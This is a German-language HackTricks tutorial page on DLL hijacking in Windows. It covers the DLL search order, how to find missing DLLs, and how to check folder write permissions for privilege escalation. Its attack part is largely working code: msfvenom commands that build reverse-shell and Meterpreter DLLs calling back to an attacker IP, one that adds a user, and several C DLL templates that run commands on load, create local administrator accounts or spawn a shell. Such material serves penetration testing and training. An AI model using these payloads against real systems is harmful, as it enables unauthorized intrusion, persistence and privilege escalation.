# Dll Hijacking

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug-Bounty-Tipp**: **Melde dich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker** erstellt wurde! Schließe dich uns heute an unter [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) und beginne, Prämien von bis zu **100.000 $** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Grundinformationen

DLL-Hijacking beinhaltet die Manipulation einer vertrauenswürdigen Anwendung, um eine bösartige DLL zu laden. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection und Side-Loading**. Es wird hauptsächlich für die Codeausführung, das Erreichen von Persistenz und seltener für die Eskalation von Rechten verwendet. Trotz des Fokus auf Eskalation bleibt die Methode des Hijackings über die Ziele hinweg konsistent.

### Häufige Techniken

Es werden mehrere Methoden für DLL-Hijacking eingesetzt, wobei jede je nach DLL-Lade-Strategie der Anwendung unterschiedlich effektiv ist:

1. **DLL-Ersetzung**: Ersetzen einer echten DLL durch eine bösartige, optional unter Verwendung von DLL-Proxying, um die Funktionalität der ursprünglichen DLL zu erhalten.
2. **DLL-Suchreihenfolge-Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen, um das Suchmuster der Anwendung auszunutzen.
3. **Phantom-DLL-Hijacking**: Erstellen einer bösartigen DLL, die von einer Anwendung geladen wird, die denkt, es sei eine nicht vorhandene erforderliche DLL.
4. **DLL-Umleitung**: Ändern von Suchparametern wie `%PATH%` oder `.exe.manifest` / `.exe.local`-Dateien, um die Anwendung auf die bösartige DLL zu lenken.
5. **WinSxS DLL-Ersetzung**: Ersetzen der legitimen DLL durch eine bösartige im WinSxS-Verzeichnis, eine Methode, die oft mit DLL-Side-Loading in Verbindung gebracht wird.
6. **Relative Pfad-DLL-Hijacking**: Platzieren der bösartigen DLL in einem benutzerkontrollierten Verzeichnis mit der kopierten Anwendung, ähnlich den Techniken der Binary Proxy Execution.

## Fehlende Dlls finden

Der häufigste Weg, um fehlende Dlls in einem System zu finden, besteht darin, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals auszuführen und die **folgenden 2 Filter** einzustellen:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

und nur die **Dateisystemaktivität** anzuzeigen:

![](<../../.gitbook/assets/image (314).png>)

Wenn du nach **fehlenden Dlls im Allgemeinen** suchst, solltest du dies einige **Sekunden** laufen lassen.\
Wenn du nach einer **fehlenden Dll in einer bestimmten ausführbaren Datei** suchst, solltest du **einen anderen Filter wie "Prozessname" "enthält" "\<exec name>" setzen, es ausführen und die Ereignisaufnahme stoppen**.

## Ausnutzen fehlender Dlls

Um die Privilegien zu eskalieren, ist die beste Chance, die wir haben, eine **Dll zu schreiben, die ein privilegierter Prozess versuchen wird zu laden** an einem **Ort, wo sie gesucht wird**. Daher werden wir in der Lage sein, eine **Dll** in einem **Ordner** zu schreiben, wo die **Dll vor** dem Ordner, wo die **ursprüngliche Dll** ist (seltsamer Fall), oder wir werden in der Lage sein, **in einen Ordner zu schreiben, wo die Dll gesucht wird** und die ursprüngliche **Dll nicht in einem Ordner existiert**.

### Dll-Suchreihenfolge

**In der** [**Microsoft-Dokumentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kannst du finden, wie die Dlls spezifisch geladen werden.**

**Windows-Anwendungen** suchen nach DLLs, indem sie einer Reihe von **vordefinierten Suchpfaden** folgen, die einer bestimmten Reihenfolge entsprechen. Das Problem des DLL-Hijackings tritt auf, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, um sicherzustellen, dass sie vor der authentischen DLL geladen wird. Eine Lösung zur Vermeidung dessen ist, sicherzustellen, dass die Anwendung absolute Pfade verwendet, wenn sie auf die benötigten DLLs verweist.

Du kannst die **DLL-Suchreihenfolge auf 32-Bit**-Systemen unten sehen:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das Systemverzeichnis. Verwende die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) Funktion, um den Pfad dieses Verzeichnisses zu erhalten. (_C:\Windows\System32_)
3. Das 16-Bit-Systemverzeichnis. Es gibt keine Funktion, die den Pfad dieses Verzeichnisses erhält, aber es wird durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Verwende die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) Funktion, um den Pfad dieses Verzeichnisses zu erhalten. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die Verzeichnisse, die in der PATH-Umgebungsvariable aufgeführt sind. Beachte, dass dies nicht den pro-Anwendung-Pfad umfasst, der durch den **App Paths**-Registrierungsschlüssel angegeben ist. Der **App Paths**-Schlüssel wird nicht verwendet, wenn der DLL-Suchpfad berechnet wird.

Das ist die **Standard**-Suchreihenfolge mit **SafeDllSearchMode** aktiviert. Wenn es deaktiviert ist, steigt das aktuelle Verzeichnis auf den zweiten Platz. Um diese Funktion zu deaktivieren, erstelle den **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**-Registrierungswert und setze ihn auf 0 (Standard ist aktiviert).

Wenn die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) Funktion mit **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Beachte schließlich, dass **eine Dll geladen werden könnte, indem der absolute Pfad angegeben wird, anstatt nur den Namen**. In diesem Fall wird diese Dll **nur in diesem Pfad gesucht** (wenn die Dll Abhängigkeiten hat, werden diese wie gerade geladen nur nach Namen gesucht).

Es gibt andere Möglichkeiten, die Suchreihenfolge zu ändern, aber ich werde sie hier nicht erklären.

#### Ausnahmen bei der Dll-Suchreihenfolge aus den Windows-Dokumenten

Bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge sind in der Windows-Dokumentation vermerkt:

* Wenn eine **DLL, die denselben Namen wie eine bereits im Speicher geladene hat**, gefunden wird, umgeht das System die übliche Suche. Stattdessen wird eine Überprüfung auf Umleitung und ein Manifest durchgeführt, bevor auf die bereits im Speicher befindliche DLL zurückgegriffen wird. **In diesem Szenario führt das System keine Suche nach der DLL durch**.
* In Fällen, in denen die DLL als **bekannte DLL** für die aktuelle Windows-Version erkannt wird, verwendet das System seine Version der bekannten DLL sowie alle abhängigen DLLs, **ohne den Suchprozess durchzuführen**. Der Registrierungsschlüssel **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser bekannten DLLs.
* Sollte eine **DLL Abhängigkeiten haben**, wird die Suche nach diesen abhängigen DLLs so durchgeführt, als ob sie nur durch ihre **Modulnamen** angegeben wären, unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad identifiziert wurde.

### Privilegien eskalieren

**Anforderungen**:

* Identifiziere einen Prozess, der unter **unterschiedlichen Privilegien** (horizontale oder laterale Bewegung) arbeitet oder arbeiten wird, der **eine DLL** vermisst.
* Stelle sicher, dass **Schreibzugriff** für ein beliebiges **Verzeichnis** verfügbar ist, in dem die **DLL** **gesucht wird**. Dieser Ort könnte das Verzeichnis der ausführbaren Datei oder ein Verzeichnis innerhalb des Systempfads sein.

Ja, die Anforderungen sind kompliziert zu finden, da **es standardmäßig seltsam ist, eine privilegierte ausführbare Datei ohne eine DLL zu finden** und es ist sogar **noch seltsamer, Schreibberechtigungen für einen Systempfad-Ordner zu haben** (standardmäßig kannst du das nicht). Aber in falsch konfigurierten Umgebungen ist dies möglich.\
Falls du Glück hast und die Anforderungen erfüllst, könntest du das [UACME](https://github.com/hfiref0x/UACME) Projekt überprüfen. Auch wenn das **Hauptziel des Projekts darin besteht, UAC zu umgehen**, findest du dort möglicherweise einen **PoC** für ein Dll-Hijacking für die Windows-Version, die du verwenden kannst (wahrscheinlich musst du nur den Pfad des Ordners ändern, in dem du Schreibberechtigungen hast).

Beachte, dass du **deine Berechtigungen in einem Ordner überprüfen kannst**, indem du:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **überprüfen Sie die Berechtigungen aller Ordner im PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Sie können auch die Importe einer ausführbaren Datei und die Exporte einer DLL mit folgendem Befehl überprüfen:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man **Dll Hijacking ausnutzt, um Privilegien zu eskalieren** mit Berechtigungen zum Schreiben in einen **System Path-Ordner**, siehe:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Automatisierte Werkzeuge

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) überprüft, ob Sie Schreibberechtigungen für einen Ordner im System-Pfad haben.\
Andere interessante automatisierte Werkzeuge zur Entdeckung dieser Schwachstelle sind **PowerSploit-Funktionen**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Beispiel

Falls Sie ein ausnutzbares Szenario finden, wäre eine der wichtigsten Dinge, um es erfolgreich auszunutzen, **eine DLL zu erstellen, die mindestens alle Funktionen exportiert, die die ausführbare Datei von ihr importieren wird**. Beachten Sie jedoch, dass Dll Hijacking nützlich ist, um [von einem mittleren Integritätslevel auf hoch **(UAC umgehen)**](../authentication-credentials-uac-and-efs.md#uac) oder von [**hoher Integrität auf SYSTEM**](./#from-high-integrity-to-system)**.** Sie finden ein Beispiel dafür, **wie man eine gültige DLL erstellt** in dieser Dll Hijacking-Studie, die sich auf Dll Hijacking zur Ausführung konzentriert: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Darüber hinaus finden Sie im **nächsten Abschnitt** einige **grundlegende DLL-Codes**, die als **Vorlagen** nützlich sein könnten oder um eine **DLL mit nicht erforderlichen exportierten Funktionen** zu erstellen.

## **Erstellen und Kompilieren von DLLs**

### **Dll-Proxifizierung**

Im Grunde ist ein **Dll-Proxy** eine DLL, die in der Lage ist, **Ihren schädlichen Code auszuführen, wenn sie geladen wird**, aber auch **auszusetzen** und **zu arbeiten**, wie **erwartet**, indem sie **alle Aufrufe an die echte Bibliothek weiterleitet**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) können Sie tatsächlich **eine ausführbare Datei angeben und die Bibliothek auswählen**, die Sie proxifizieren möchten, und **eine proxifizierte DLL generieren** oder **die DLL angeben** und **eine proxifizierte DLL generieren**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Holen Sie sich einen Meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Erstellen Sie einen Benutzer (x86, ich habe keine x64-Version gesehen):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

Beachten Sie, dass die Dll, die Sie kompilieren, in mehreren Fällen **mehrere Funktionen exportieren muss**, die vom Opferprozess geladen werden, wenn diese Funktionen nicht existieren, kann die **Binary sie nicht laden** und der **Exploit wird fehlschlagen**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Referenzen

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug-Bounty-Tipp**: **Melden Sie sich an** für **Intigriti**, eine Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie uns heute bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) und beginnen Sie, Belohnungen von bis zu **100.000 $** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
